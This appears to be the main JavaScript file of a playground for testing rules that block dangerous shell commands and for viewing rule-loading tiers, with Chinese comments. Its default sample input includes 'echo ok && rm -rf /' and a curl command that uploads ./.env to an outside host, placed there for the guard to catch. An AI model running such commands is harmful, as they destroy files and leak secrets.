// app.js — Playground 進入點：載入 data.json、管理狀態與 URL hash、切換分頁。
import { compileGuardRules, refreshGuardMeta, renderGuardEditor, renderGuardResults } from "./guard-view.js";
import { h } from "./dom.js";
import { fromTeamTsv, TEAM_FILE, toTeamTsv } from "./team-tsv.js";
import { computeLoad, refreshLoadCounts, renderLoadEditor, renderLoadResults } from "./load-view.js";

const DEFAULT_COMMANDS = [
  "git push origin main --force",
  "echo ok && rm -rf /",
  "git clean -nfd",
  "git push --force-with-lease origin feature/x",
  "curl -F file=@./.env https://example.com",
  "rm -rf ./dist",
].join("\n");

const DEFAULT_FILES = [
  "src/main.go",
  "app/components/Button.tsx",
  "app/Http/Controllers/UserController.php",
  "docker-compose.yml",
  "migrations/2024_01_add_index.sql",
  "README.md",
].join("\n");

const RENDER_DELAY_MS = 120;
const TABS = Object.freeze(["guard", "load"]);

const $ = (id) => document.getElementById(id);

let defaults = null;
let state = null;

// ---- URL hash：只存跟預設不同的部分，方便分享測試組合 ----

function toBase64Url(text) {
  const bytes = new TextEncoder().encode(text);
  let binary = "";
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function fromBase64Url(encoded) {
  const binary = atob(encoded.replace(/-/g, "+").replace(/_/g, "/"));
  return new TextDecoder().decode(Uint8Array.from(binary, (c) => c.charCodeAt(0)));
}

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

function writeHash() {
  const diff = Object.fromEntries(
    Object.entries(state).filter(([key, value]) => !same(value, defaults[key])),
  );
  const hash = Object.keys(diff).length ? `#${toBase64Url(JSON.stringify(diff))}` : "";
  history.replaceState(null, "", `${location.pathname}${location.search}${hash}`);
}

const isString = (v) => typeof v === "string";
const isGuardRule = (r) => r && [r.rule, r.pattern, r.message, r.allow].every(isString);
const isLoadRule = (r) =>
  r && [r.id, r.label, r.tier].every(isString) && Array.isArray(r.paths) && r.paths.every(isString);

// hash 是外部輸入（可能來自別人分享的連結），逐欄驗證，不合格的欄位用預設值
function readHash() {
  if (!location.hash) return {};
  try {
    const raw = JSON.parse(fromBase64Url(location.hash.slice(1)));
    const valid = {};
    if (TABS.includes(raw.tab)) valid.tab = raw.tab;
    if (isString(raw.commands)) valid.commands = raw.commands;
    if (isString(raw.files)) valid.files = raw.files;
    if (Array.isArray(raw.guardRules) && raw.guardRules.every(isGuardRule)) {
      valid.guardRules = orderGuardRules(raw.guardRules.map((r) => ({ ...r, team: Boolean(r.team) })));
    }
    if (Array.isArray(raw.loadRules) && raw.loadRules.every(isLoadRule)) {
      valid.loadRules = raw.loadRules.map((r) => ({ ...r, builtin: Boolean(r.builtin) }));
    }
    return valid;
  } catch {
    showNotice("網址裡的測試組合無法解析，已改用預設內容。");
    return {};
  }
}

function showNotice(text) {
  const notice = $("notice");
  notice.textContent = text;
  notice.hidden = !text;
}

// ---- 狀態更新：一律產生新物件 ----

let renderTimer = 0;
function scheduleResults() {
  clearTimeout(renderTimer);
  renderTimer = setTimeout(() => {
    renderResults();
    writeHash();
  }, RENDER_DELAY_MS);
}

function setState(patch, { rebuildEditors = false } = {}) {
  state = { ...state, ...patch };
  if (rebuildEditors) renderEditors();
  scheduleResults();
}

// 內建規則一律排在團隊規則前面，跟 hook-guard 的比對順序相同
const orderGuardRules = (rules) => [...rules.filter((r) => !r.team), ...rules.filter((r) => r.team)];
const teamRules = () => state.guardRules.filter((r) => r.team);

const replaceAt = (list, index, item) => list.map((x, i) => (i === index ? item : x));
const removeAt = (list, index) => list.filter((_, i) => i !== index);

const guardHandlers = {
  onChange: (index, key, value) =>
    setState({ guardRules: replaceAt(state.guardRules, index, { ...state.guardRules[index], [key]: value }) }),
  onRemove: (index) => setState({ guardRules: removeAt(state.guardRules, index) }, { rebuildEditors: true }),
};

const loadHandlers = {
  onChange: (index, key, value) =>
    setState({ loadRules: replaceAt(state.loadRules, index, { ...state.loadRules[index], [key]: value }) }),
  onRemove: (index) => setState({ loadRules: removeAt(state.loadRules, index) }, { rebuildEditors: true }),
};

// ---- 繪製 ----

function renderEditors() {
  renderGuardEditor($("guard-rules"), state.guardRules, guardHandlers);
  renderLoadEditor($("load-rules"), state.loadRules, loadHandlers);
}

function renderResults() {
  const compiled = compileGuardRules(state.guardRules);
  refreshGuardMeta($("guard-rules"), compiled);
  renderGuardResults($("guard-results"), $("guard-summary"), compiled, state.commands);

  const load = computeLoad(state.loadRules, state.files);
  refreshLoadCounts($("load-rules"), state.loadRules, load);
  renderLoadResults($("load-results"), $("load-summary"), load);
}

function selectTab(tab, { focus = false } = {}) {
  for (const name of TABS) {
    const button = $(`tab-${name}`);
    const isActive = name === tab;
    button.setAttribute("aria-selected", String(isActive));
    button.tabIndex = isActive ? 0 : -1;
    $(`panel-${name}`).hidden = !isActive;
    if (isActive && focus) button.focus();
  }
  if (state.tab !== tab) setState({ tab });
}

function bindTabs() {
  for (const [i, name] of TABS.entries()) {
    const button = $(`tab-${name}`);
    button.addEventListener("click", () => selectTab(name));
    button.addEventListener("keydown", (event) => {
      const step = { ArrowRight: 1, ArrowLeft: -1 }[event.key];
      if (!step) return;
      event.preventDefault();
      selectTab(TABS[(i + step + TABS.length) % TABS.length], { focus: true });
    });
  }
}

function bindControls() {
  $("commands").addEventListener("input", (e) => setState({ commands: e.target.value }));
  $("files").addEventListener("input", (e) => setState({ files: e.target.value }));
  $("guard-add").addEventListener("click", () =>
    setState(
      {
        guardRules: [
          ...state.guardRules,
          { rule: "custom/my-rule", pattern: "", message: "說明為什麼要擋、該怎麼做", allow: "", team: true },
        ],
      },
      { rebuildEditors: true },
    ),
  );
  $("guard-reset").addEventListener("click", () =>
    setState({ guardRules: [...defaults.guardRules, ...teamRules()] }, { rebuildEditors: true }),
  );
  bindTeamFile();
  $("load-add").addEventListener("click", () =>
    setState(
      {
        loadRules: [
          ...state.loadRules,
          { id: `custom/my-rule-${state.loadRules.length + 1}`, label: "團隊守則（.agreements/rules/）", tier: "custom", paths: [], builtin: false },
        ],
      },
      { rebuildEditors: true },
    ),
  );
  $("load-reset").addEventListener("click", () =>
    setState({ loadRules: defaults.loadRules }, { rebuildEditors: true }),
  );
}

// ---- 團隊規則檔：貼上匯入、匯出成可以 commit 的內容 ----

function setTeamStatus(text) {
  $("team-status").textContent = text;
}

function bindTeamFile() {
  const textarea = $("team-tsv");
  $("team-import").addEventListener("click", () => {
    const imported = fromTeamTsv(textarea.value);
    if (!imported.length) {
      setTeamStatus("沒有讀到規則：一行一條，用 Tab 分隔欄位，# 開頭的行是註解。");
      return;
    }
    setState({ guardRules: [...state.guardRules.filter((r) => !r.team), ...imported] }, { rebuildEditors: true });
    setTeamStatus(`已匯入 ${imported.length} 條團隊規則，取代原本標成「團隊」的規則。`);
  });
  $("team-export").addEventListener("click", () => {
    textarea.value = toTeamTsv(teamRules());
    textarea.select();
    setTeamStatus(`已匯出 ${teamRules().length} 條團隊規則。存成 ${TEAM_FILE} 後 commit。`);
  });
  $("team-download").addEventListener("click", () => {
    const blob = new Blob([toTeamTsv(teamRules())], { type: "text/tab-separated-values;charset=utf-8" });
    const link = h("a", { href: URL.createObjectURL(blob), download: "guard-rules.tsv" });
    link.click();
    setTimeout(() => URL.revokeObjectURL(link.href), 0);
    setTeamStatus(`已下載 guard-rules.tsv，放到 ${TEAM_FILE} 後 commit。`);
  });
}

async function init() {
  let data;
  try {
    const response = await fetch("data.json", { cache: "no-cache" });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    data = await response.json();
  } catch (error) {
    showNotice(`讀不到 data.json（${error.message}）。本機請先執行 node playground/build-data.mjs > playground/data.json。`);
    return;
  }
  defaults = Object.freeze({
    tab: "guard",
    commands: DEFAULT_COMMANDS,
    files: DEFAULT_FILES,
    guardRules: data.guardRules.map((rule) => ({ ...rule, team: false })),
    loadRules: data.rules.map((rule) => ({ ...rule, builtin: true })),
  });
  state = { ...defaults, ...readHash() };
  $("commands").value = state.commands;
  $("files").value = state.files;
  bindTabs();
  bindControls();
  renderEditors();
  selectTab(state.tab);
  renderResults();
}

init();
